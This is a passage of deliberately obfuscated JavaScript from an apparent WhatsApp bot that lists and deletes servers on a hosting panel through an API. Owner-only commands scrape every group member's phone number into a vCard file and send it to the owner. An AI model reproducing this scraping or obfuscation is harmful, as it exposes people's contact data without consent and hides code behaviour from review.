                    _0xb9c774 += _0x5d4417(0x190) + _0x4f8f15['id'] + (_0x5d4417(0xf6b) + '\x20*') + _0x4f8f15[_0x5d4417(0x277)] + (_0x5d4417(0x379) + '*') + (_0x2a5309[_0x5d4417(0x972)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)], 0x1676 + -0x23e4 + 0x3 * 0x47a) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0xedf)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xf65)], 0x53 * -0x4 + 0x325 * -0x2 + 0x79a) ? _0x2a5309[_0x5d4417(0x6e2)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](-0x1380 + -0x27 * 0x8e + -0x5a * -0x75, -0x29 * 0xe + -0x40f * 0x1 + -0x5f * -0x11)[_0x5d4417(0x8b2)](''), 'GB') : _0x2a5309[_0x5d4417(0x4c8)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xf65)], 0x11f * -0x11 + 0x383 + 0x3 * 0x530) ? _0x2a5309[_0x5d4417(0x532)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0xc17 * 0x1 + -0x4f + 0xf * -0xc9), 'GB') : _0x2a5309[_0x5d4417(0x42b)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x31 * -0x63 + -0xb47 + -0x6a * -0x49), 'GB')) + (_0x5d4417(0x10ca) + '*') + (_0x2a5309[_0x5d4417(0x3b0)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0x5ce)], 0xa63 * -0x1 + 0x619 + 0x7a * 0x9) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x3e6)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0x5ce)][_0x5d4417(0xef4)](), '%')) + (_0x5d4417(0x306) + '\x20*') + (_0x2a5309[_0x5d4417(0xfa8)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0xd81)], 0x2568 + -0x11bf + -0x13a9) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0xd0b)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xf65)], -0x348 + 0x1a57 + -0x76 * 0x32) ? _0x2a5309[_0x5d4417(0x1142)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x1 * 0x1055 + -0x1a * -0x146 + 0x62e * -0x8), 'GB') : _0x2a5309[_0x5d4417(0xcbb)](_0x4f8f15[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](-0x2 * -0xdb5 + -0x3e + 0x2 * -0xd96), 'GB')) + (_0x5d4417(0x1143) + _0x5d4417(0xe76)) + _0x4f8f15[_0x5d4417(0xaa4)][_0x5d4417(0xc6c)]('T')[0x1 * 0x18ab + -0x1c7d + 0x2 * 0x1e9] + '\x0a';
                }
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'buttons': [{
                            'buttonId': _0x5d4417(0x361),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0xf68)] },
                            'type': 0x1
                        }],
                    'footer': _0x5d4417(0xee4) + botname,
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'text': _0xb9c774,
                    'contextInfo': {
                        'isForwarded': !![],
                        'mentionedJid': [
                            _0xedb653[_0x5d4417(0xeee)],
                            _0x2a5309[_0x5d4417(0xe42)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                        ]
                    }
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0xe92)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xfe9)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97) {
                    let _0x34cc03 = await _0x2a5309[_0x5d4417(0x1f1)](fetch, _0x2a5309[_0x5d4417(0x91d)](domain, _0x2a5309[_0x5d4417(0xa1e)]), {
                            'method': _0x2a5309[_0x5d4417(0xea5)],
                            'headers': {
                                'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                'Authorization': _0x2a5309[_0x5d4417(0xd49)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                            }
                        }), _0x260ee9 = await _0x34cc03[_0x5d4417(0x728)](), _0x4dc4bc = _0x260ee9[_0x5d4417(0x1059)];
                    if (_0x2a5309[_0x5d4417(0x4ed)](_0x4dc4bc[_0x5d4417(0xf65)], 0x18f7 + 0x1d42 + 0x56c * -0xa))
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1021)]);
                    let _0x15a7d6 = [];
                    return await _0x4dc4bc[_0x5d4417(0x102c)](_0x411f6a => {
                        const _0xf7e898 = _0x5d4417;
                        if (_0x2a5309[_0xf7e898(0x2b4)](_0x411f6a[_0xf7e898(0x7f4)][_0xf7e898(0x1084)], !![]))
                            return;
                        _0x15a7d6[_0xf7e898(0x706)]({
                            'title': _0x411f6a[_0xf7e898(0x7f4)][_0xf7e898(0xcf9)] + _0xf7e898(0xd97) + _0x411f6a[_0xf7e898(0x7f4)]['id'] + ')',
                            'id': _0xf7e898(0x84a) + _0x411f6a[_0xf7e898(0x7f4)]['id']
                        });
                    }), _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'buttons': [{
                                'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                                'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                                'type': 0x4,
                                'nativeFlowInfo': {
                                    'name': _0x2a5309[_0x5d4417(0xdc6)],
                                    'paramsJson': JSON[_0x5d4417(0x78f)]({
                                        'title': _0x2a5309[_0x5d4417(0x2b9)],
                                        'sections': [{
                                                'title': _0x2a5309[_0x5d4417(0x5b7)],
                                                'rows': [..._0x15a7d6]
                                            }]
                                    })
                                }
                            }],
                        'footer': _0x5d4417(0xee4) + botname,
                        'headerType': 0x1,
                        'viewOnce': !![],
                        'text': _0x2a5309[_0x5d4417(0xc99)],
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [
                                _0xedb653[_0x5d4417(0xeee)],
                                _0x2a5309[_0x5d4417(0x42b)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                            ]
                        }
                    }, { 'quoted': _0xedb653 });
                }
                let _0x28ae1b = await _0x2a5309[_0x5d4417(0x6a9)](fetch, _0x2a5309[_0x5d4417(0xb17)](domain, _0x2a5309[_0x5d4417(0xa1e)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0xd84)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                        }
                    }), _0x2c2844 = await _0x28ae1b[_0x5d4417(0x728)](), _0x1c409a = _0x2c2844[_0x5d4417(0x1059)], _0x20afda = null, _0x1932bd = null;
                await _0x1c409a[_0x5d4417(0x102c)](async _0x4c230c => {
                    const _0x7bd9b8 = _0x5d4417;
                    if (_0x2a5309[_0x7bd9b8(0x96f)](_0x4c230c[_0x7bd9b8(0x7f4)]['id'], _0x5c5935[0x13c + 0x28 * -0x88 + 0x1404]) && _0x2a5309[_0x7bd9b8(0xd83)](_0x4c230c[_0x7bd9b8(0x7f4)][_0x7bd9b8(0x1084)], !![])) {
                        _0x20afda = _0x4c230c[_0x7bd9b8(0x7f4)][_0x7bd9b8(0x1104)], _0x1932bd = _0x4c230c[_0x7bd9b8(0x7f4)]['id'];
                        let _0x3451db = await _0x2a5309[_0x7bd9b8(0xa64)](fetch, _0x2a5309[_0x7bd9b8(0x2d2)](domain, _0x7bd9b8(0x958) + _0x7bd9b8(0xb86) + _0x7bd9b8(0x1052) + _0x1932bd), {
                                'method': _0x2a5309[_0x7bd9b8(0x988)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x7bd9b8(0xe03)],
                                    'Content-Type': _0x2a5309[_0x7bd9b8(0xe03)],
                                    'Authorization': _0x2a5309[_0x7bd9b8(0x7fc)](_0x2a5309[_0x7bd9b8(0xbee)], apikey)
                                }
                            }), _0x518077 = _0x3451db['ok'] ? { 'errors': null } : await _0x3451db[_0x7bd9b8(0x728)]();
                    }
                });
                if (_0x2a5309[_0x5d4417(0xd93)](_0x1932bd, null))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x651)]);
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0xf9d) + _0x5d4417(0x87c) + _0x5d4417(0x814) + _0x2a5309[_0x5d4417(0x5ad)](capital, _0x20afda) + '*');
            }
            break;
        case _0x2a5309[_0x5d4417(0x3ee)]: {
                if (_0x2a5309[_0x5d4417(0x230)](!_0x47f98c, !_0x73fd3b))
                    return _0x2a5309[_0x5d4417(0xd51)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97) {
                    let _0x4421eb = [], _0x423d4c = await _0x2a5309[_0x5d4417(0x9b3)](fetch, _0x2a5309[_0x5d4417(0x832)](domain, _0x2a5309[_0x5d4417(0xdf3)]), {
                            'method': _0x2a5309[_0x5d4417(0xea5)],
                            'headers': {
                                'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                'Authorization': _0x2a5309[_0x5d4417(0x743)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                            }
                        }), _0x223e45 = await _0x423d4c[_0x5d4417(0x728)](), _0x502309 = _0x223e45[_0x5d4417(0x1059)];
                    if (_0x2a5309[_0x5d4417(0x9e6)](_0x502309[_0x5d4417(0xf65)], 0x1 * -0x256b + 0x1d * -0x50 + 0x2e7c))
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x10a4)]);
                    for (let _0x119faf of _0x502309) {
                        let _0x373438 = _0x119faf[_0x5d4417(0x7f4)], _0x8a7e6e = await _0x2a5309[_0x5d4417(0x1023)](fetch, _0x2a5309[_0x5d4417(0x44d)](_0x2a5309[_0x5d4417(0xc6b)](_0x2a5309[_0x5d4417(0xc96)](domain, _0x2a5309[_0x5d4417(0xedb)]), _0x373438[_0x5d4417(0x60c)][_0x5d4417(0xc6c)]`-`[0x1 * 0x25f1 + 0x3 * 0xc9 + -0x284c]), _0x2a5309[_0x5d4417(0xc92)]), {
                                'method': _0x2a5309[_0x5d4417(0xea5)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0x3f4)](_0x2a5309[_0x5d4417(0xbee)], capikey)
                                }
                            }), _0x285162 = await _0x8a7e6e[_0x5d4417(0x728)](), _0x277374 = _0x285162[_0x5d4417(0x7f4)] ? _0x285162[_0x5d4417(0x7f4)][_0x5d4417(0x986) + _0x5d4417(0x10f4)] : _0x373438[_0x5d4417(0x466)];
                        _0x4421eb[_0x5d4417(0x706)]({
                            'title': _0x373438[_0x5d4417(0x277)] + _0x5d4417(0xd97) + _0x373438['id'] + ')',
                            'description': _0x5d4417(0x649) + (_0x2a5309[_0x5d4417(0xceb)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)], 0xe * -0xaf + -0x6d * -0x1a + -0x180) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x1038)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xf65)], 0x1543 * -0x1 + -0x18 * 0xc + 0xb9 * 0x1f) ? _0x2a5309[_0x5d4417(0x90d)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](-0x1c1a + 0x2 * 0x10c9 + -0x578, -0x2 * 0xb5a + -0x6ac * 0x3 + 0x2aba)[_0x5d4417(0x8b2)](''), 'GB') : _0x2a5309[_0x5d4417(0x9e6)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xf65)], -0x7e6 * -0x1 + -0xa7e + 0x4 * 0xa7) ? _0x2a5309[_0x5d4417(0x208)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x1079 + -0x572 + -0xb06), 'GB') : _0x2a5309[_0x5d4417(0x1094)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x1 * -0x7bb + -0xe59 * 0x2 + 0x246d), 'GB')) + _0x5d4417(0xd9d) + (_0x2a5309[_0x5d4417(0x5b4)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0xd81)], 0x2d1 + -0x7e1 * -0x4 + -0x2255) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x1038)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xf65)], 0x69d * -0x1 + 0x1 * -0x10e7 + 0x13d * 0x13) ? _0x2a5309[_0x5d4417(0x1016)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x9d5 + 0xc75 * -0x2 + 0xf16), 'GB') : _0x2a5309[_0x5d4417(0xce3)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x1a * 0xc5 + -0x178b + 0x5 * 0xb5), 'GB')) + _0x5d4417(0x326) + (_0x2a5309[_0x5d4417(0x111b)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0x5ce)], 0x1457 + -0x83 * 0x43 + 0xdf2) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x702)](_0x373438[_0x5d4417(0x2a8)][_0x5d4417(0x5ce)][_0x5d4417(0xef4)](), '%')),
                            'id': _0x5d4417(0x1088) + _0x373438['id']
                        });
                    }
                    return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'buttons': [{
                                'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                                'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                                'type': 0x4,
                                'nativeFlowInfo': {
                                    'name': _0x2a5309[_0x5d4417(0xdc6)],
                                    'paramsJson': JSON[_0x5d4417(0x78f)]({
                                        'title': _0x2a5309[_0x5d4417(0x9d3)],
                                        'sections': [{
                                                'title': _0x2a5309[_0x5d4417(0x378)],
                                                'rows': [..._0x4421eb]
                                            }]
                                    })
                                }
                            }],
                        'footer': _0x5d4417(0xee4) + botname,
                        'headerType': 0x1,
                        'viewOnce': !![],
                        'text': _0x2a5309[_0x5d4417(0xc95)],
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [
                                _0xedb653[_0x5d4417(0xeee)],
                                _0x2a5309[_0x5d4417(0x10f0)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                            ]
                        }
                    }, { 'quoted': _0xedb653 });
                }
                let _0x3585be = await _0x2a5309[_0x5d4417(0x11b2)](fetch, _0x2a5309[_0x5d4417(0x45a)](domain, _0x2a5309[_0x5d4417(0xdf3)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0xd8b)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                        }
                    }), _0x373c1b = await _0x3585be[_0x5d4417(0x728)](), _0x235572 = _0x373c1b[_0x5d4417(0x1059)], _0x2fe6bd, _0x47533b;
                for (let _0x5849ea of _0x235572) {
                    let _0x7e3e26 = _0x5849ea[_0x5d4417(0x7f4)];
                    if (_0x2a5309[_0x5d4417(0x11af)](_0x2a5309[_0x5d4417(0xcae)](Number, _0x156b97), _0x7e3e26['id'])) {
                        _0x2fe6bd = _0x7e3e26[_0x5d4417(0x277)][_0x5d4417(0xec1) + 'e'](), _0x47533b = _0x7e3e26[_0x5d4417(0x277)];
                        let _0x436635 = await _0x2a5309[_0x5d4417(0x1eb)](fetch, _0x2a5309[_0x5d4417(0x7a7)](domain, _0x5d4417(0x958) + _0x5d4417(0xf8f) + _0x5d4417(0x34e) + _0x7e3e26['id']), {
                                'method': _0x2a5309[_0x5d4417(0x988)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0xc7d)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                                }
                            }), _0xd60b0a = _0x436635['ok'] ? { 'errors': null } : await _0x436635[_0x5d4417(0x728)]();
                    }
                }
                let _0x3cb6c1 = await _0x2a5309[_0x5d4417(0x9e3)](fetch, _0x2a5309[_0x5d4417(0x202)](domain, _0x2a5309[_0x5d4417(0xa1e)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0xa44)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                        }
                    }), _0x4a5594 = await _0x3cb6c1[_0x5d4417(0x728)](), _0x5b984f = _0x4a5594[_0x5d4417(0x1059)];
                for (let _0x1d564f of _0x5b984f) {
                    let _0x3cbe9e = _0x1d564f[_0x5d4417(0x7f4)];
                    if (_0x2a5309[_0x5d4417(0xd1f)](_0x3cbe9e[_0x5d4417(0xcf9)][_0x5d4417(0xec1) + 'e'](), _0x2fe6bd)) {
                        let _0x329956 = await _0x2a5309[_0x5d4417(0x878)](fetch, _0x2a5309[_0x5d4417(0xd84)](domain, _0x5d4417(0x958) + _0x5d4417(0xb86) + _0x5d4417(0x1052) + _0x3cbe9e['id']), {
                                'method': _0x2a5309[_0x5d4417(0x988)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0x83c)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                                }
                            }), _0x57cff8 = _0x329956['ok'] ? { 'errors': null } : await _0x329956[_0x5d4417(0x728)]();
                    }
                }
                if (_0x2a5309[_0x5d4417(0x97b)](_0x2fe6bd, undefined))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x370)]);
                _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0x8b6) + _0x5d4417(0x10a1) + _0x5d4417(0xd1d) + _0x2a5309[_0x5d4417(0x11b6)](capital, _0x47533b) + '*');
            }
            break;
        case _0x2a5309[_0x5d4417(0x47d)]:
        case _0x2a5309[_0x5d4417(0x5e6)]:
        case _0x2a5309[_0x5d4417(0x619)]: {
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'footer': _0x5d4417(0xee4) + botname,
                    'buttons': [{
                            'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                            'type': 0x4,
                            'nativeFlowInfo': {
                                'name': _0x2a5309[_0x5d4417(0xdc6)],
                                'paramsJson': JSON[_0x5d4417(0x78f)]({
                                    'title': _0x2a5309[_0x5d4417(0xc3c)],
                                    'sections': [{
                                            'title': _0x2a5309[_0x5d4417(0x6e0)],
                                            'highlight_label': _0x2a5309[_0x5d4417(0x3b9)],
                                            'rows': [
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x92b)],
                                                    'id': _0x2a5309[_0x5d4417(0x52f)]
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0xe99)],
                                                    'id': _0x2a5309[_0x5d4417(0xd25)]
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x49f)],
                                                    'id': _0x2a5309[_0x5d4417(0x9f1)]
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x3c6)],
                                                    'id': _0x2a5309[_0x5d4417(0x1bb)]
                                                }
                                            ]
                                        }]
                                })
                            }
                        }],
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'text': _0x2a5309[_0x5d4417(0x5e8)]
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0xa5f)]: {
                if (!isOwner)
                    return _0x2a5309[_0x5d4417(0xabf)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x5ac)](_0x1ac933, _0x2a5309[_0x5d4417(0x804)]));
                let _0x57b85e = await _0x57ed02[_0x5d4417(0xe80) + _0x5d4417(0x4ce)](_0x156b97);
                const _0x58dcb1 = await _0x57b85e[_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0xde7)](_0x5d8473 => _0x5d8473['id'][_0x5d4417(0xdb3)](_0x5d4417(0xea1)))[_0x5d4417(0x462)](_0x45b1ed => _0x45b1ed['id']);
                for (let _0x15f354 of _0x58dcb1) {
                    _0x2a5309[_0x5d4417(0x73c)](_0x15f354, _0x4815f3) && _0x2a5309[_0x5d4417(0x28e)](_0x15f354[_0x5d4417(0xc6c)]('@')[0x2 * 0xb26 + -0x12c4 + -0x388], global[_0x5d4417(0x41d)]) && (contacts[_0x5d4417(0x706)](_0x15f354), fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0xc28)], JSON[_0x5d4417(0x78f)](contacts)));
                }
                try {
                    const _0x2af03a = [...new Set(contacts)], _0x1e7ad8 = _0x2af03a[_0x5d4417(0x462)]((_0x7dce30, _0x26a30e) => {
                            const _0x18dc31 = _0x5d4417, _0x229f60 = [
                                    _0x2a5309[_0x18dc31(0xcf5)],
                                    _0x2a5309[_0x18dc31(0x93d)],
                                    _0x18dc31(0x115c) + _0x18dc31(0x5c7) + '-\x20' + _0x7dce30[_0x18dc31(0xc6c)]('@')[0x216d + 0x1fc8 + -0x4135],
                                    _0x18dc31(0x626) + _0x18dc31(0x89a) + _0x18dc31(0xd60) + _0x7dce30[_0x18dc31(0xc6c)]('@')[0x1a13 + 0x62a + -0x1 * 0x203d] + ':+' + _0x7dce30[_0x18dc31(0xc6c)]('@')[0x9f * 0x29 + 0x117d + -0x157a * 0x2],
                                    _0x2a5309[_0x18dc31(0x33f)],
                                    ''
                                ][_0x18dc31(0x8b2)]('\x0a');
                            return _0x229f60;
                        })[_0x5d4417(0x8b2)]('');
                    fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x4e1)], _0x1e7ad8, _0x2a5309[_0x5d4417(0xdd8)]);
                } catch (_0x29dfd3) {
                    _0xedb653[_0x5d4417(0x105d)](_0x29dfd3[_0x5d4417(0xef4)]());
                } finally {
                    const _0x4127ea = _0x2a5309[_0x5d4417(0x977)][_0x5d4417(0xc6c)]('|');
                    let _0x3933b1 = -0x2b * 0xdb + -0x1d77 * -0x1 + -0x752 * -0x1;
                    while (!![]) {
                        switch (_0x4127ea[_0x3933b1++]) {
                        case '0':
                            if (_0x2a5309[_0x5d4417(0x28e)](_0xedb653[_0x5d4417(0x9e2)], _0xedb653[_0x5d4417(0xeee)]))
                                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x479) + _0x5d4417(0x7ef) + _0x5d4417(0x2d1) + _0x5d4417(0xa27) + _0x5d4417(0x9bd) + _0x5d4417(0x739) + _0x5d4417(0xf42) + _0x5d4417(0x769) + '\x20*' + _0x58dcb1[_0x5d4417(0xf65)] + _0x5d4417(0xcad));
                            continue;
                        case '1':
                            await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0xeee)], {
                                'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x4e1)]),
                                'fileName': _0x2a5309[_0x5d4417(0x896)],
                                'caption': _0x5d4417(0x285) + _0x5d4417(0x4fa) + _0x5d4417(0x925) + _0x5d4417(0xc1a) + _0x58dcb1[_0x5d4417(0xf65)] + _0x5d4417(0xcad),
                                'mimetype': _0x2a5309[_0x5d4417(0x9ab)]
                            }, { 'quoted': _0xedb653 });
                            continue;
                        case '2':
                            contacts[_0x5d4417(0xa5a)](0x26aa + -0x2689 + 0x3 * -0xb, contacts[_0x5d4417(0xf65)]);
                            continue;
                        case '3':
                            await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x4e1)], '');
                            continue;
                        case '4':
                            await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0xc28)], JSON[_0x5d4417(0x78f)](contacts));
                            continue;
                        }
                        break;
                    }
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x102e)]: {
                if (!isOwner)
                    return _0x2a5309[_0x5d4417(0x312)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x201)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                let _0x157e62 = await _0xedb653[_0x5d4417(0x2e8)];
                const _0x3eaaf8 = await _0x157e62[_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0xde7)](_0x10f3e5 => _0x10f3e5['id'][_0x5d4417(0xdb3)](_0x5d4417(0xea1)))[_0x5d4417(0x462)](_0x476b2d => _0x476b2d['id']);
                for (let _0x34627f of _0x3eaaf8) {
                    _0x2a5309[_0x5d4417(0x9bf)](_0x34627f, _0x4815f3) && _0x2a5309[_0x5d4417(0xaf4)](_0x34627f[_0x5d4417(0xc6c)]('@')[0x7 * -0x27 + -0x1d80 + -0x1 * -0x1e91], global[_0x5d4417(0x41d)]) && (contacts[_0x5d4417(0x706)](_0x34627f), fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0xc28)], JSON[_0x5d4417(0x78f)](contacts)));
                }
                try {
                    const _0x34b09f = [...new Set(contacts)], _0x2aa04e = _0x34b09f[_0x5d4417(0x462)]((_0x35dd64, _0x225583) => {
                            const _0x47b2a4 = _0x5d4417, _0x42152c = [
                                    _0x2a5309[_0x47b2a4(0xcf5)],
                                    _0x2a5309[_0x47b2a4(0x93d)],
                                    _0x47b2a4(0x115c) + _0x47b2a4(0x5c7) + '-\x20' + _0x35dd64[_0x47b2a4(0xc6c)]('@')[0x114 * -0x12 + -0x1f * 0x8b + 0x243d],
                                    _0x47b2a4(0x626) + _0x47b2a4(0x89a) + _0x47b2a4(0xd60) + _0x35dd64[_0x47b2a4(0xc6c)]('@')[-0x15 * 0xef + -0x8fe * -0x2 + 0x19f] + ':+' + _0x35dd64[_0x47b2a4(0xc6c)]('@')[0x4f * -0x1b + -0x5ca + 0x2d3 * 0x5],
                                    _0x2a5309[_0x47b2a4(0x33f)],
                                    ''
                                ][_0x47b2a4(0x8b2)]('\x0a');
                            return _0x42152c;
                        })[_0x5d4417(0x8b2)]('');
                    fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x4e1)], _0x2aa04e, _0x2a5309[_0x5d4417(0xdd8)]);
                } catch (_0x4d4aa2) {
                    _0xedb653[_0x5d4417(0x105d)](_0x4d4aa2[_0x5d4417(0xef4)]());
                } finally {
                    const _0x3b4159 = _0x2a5309[_0x5d4417(0x53e)][_0x5d4417(0xc6c)]('|');
                    let _0x59d77d = -0x1 * 0x2207 + 0x845 * 0x3 + -0x49c * -0x2;
                    while (!![]) {
                        switch (_0x3b4159[_0x59d77d++]) {
                        case '0':
                            if (_0x2a5309[_0x5d4417(0x9bf)](_0xedb653[_0x5d4417(0x9e2)], _0xedb653[_0x5d4417(0xeee)]))
                                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x479) + _0x5d4417(0x7ef) + _0x5d4417(0x2d1) + _0x5d4417(0xa27) + _0x5d4417(0x9bd) + _0x5d4417(0x739) + _0x5d4417(0xf42) + _0x5d4417(0x769) + '\x20*' + _0x3eaaf8[_0x5d4417(0xf65)] + _0x5d4417(0xcad));
                            continue;
                        case '1':
                            await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0xeee)], {
                                'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x4e1)]),
                                'fileName': _0x2a5309[_0x5d4417(0x896)],
                                'caption': _0x5d4417(0x285) + _0x5d4417(0x4fa) + _0x5d4417(0x925) + _0x5d4417(0xc1a) + _0x3eaaf8[_0x5d4417(0xf65)] + _0x5d4417(0xcad),
